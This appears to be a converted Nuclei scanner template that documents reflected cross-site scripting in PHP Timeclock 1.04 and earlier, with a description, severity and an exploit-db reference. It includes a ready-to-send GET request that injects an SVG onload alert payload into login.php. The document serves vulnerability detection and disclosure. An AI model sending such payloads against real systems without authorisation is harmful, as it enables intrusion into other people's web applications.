# Nuclei Template: PHP Timeclock <=1.04 - Cross-Site Scripting
**Template ID:** php-timeclock-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`php-timeclock-xss.yaml`)

## Vulnerability Information & PoC

## Description
PHP Timeclock 1.04 and prior contains multiple cross-site scripting vulnerabilities via login.php, timeclock.php, reports/audit.php. and reports/timerpt.php

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/login.php/'%3E%3Csvg/onload=alert%60{{randstr}}%60%3E
```

## References
- https://www.exploit-db.com/exploits/49853
